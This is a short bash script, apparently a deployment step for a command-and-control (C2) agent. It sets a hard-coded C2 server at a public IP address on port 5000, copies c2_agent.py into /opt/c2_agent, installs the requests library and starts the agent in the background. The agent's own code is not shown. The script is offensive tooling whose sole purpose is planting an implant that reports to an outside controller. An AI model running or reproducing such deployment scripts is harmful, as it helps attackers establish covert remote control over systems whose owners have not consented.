#!/bin/bash

C2_SERVER="http://107.152.44.183:5000"
AGENT_DIR="/opt/c2_agent"

echo "========================================"
echo "  C2 AGENT DEPLOYMENT"
echo "  Server: $C2_SERVER"
echo "========================================"

# Create directory
mkdir -p $AGENT_DIR
cp agent/c2_agent.py $AGENT_DIR/

# Install dependencies
pip3 install requests

# Run agent
cd $AGENT_DIR
python3 c2_agent.py &

echo "[+] Agent deployed and running"
echo "[+] PID: $!"
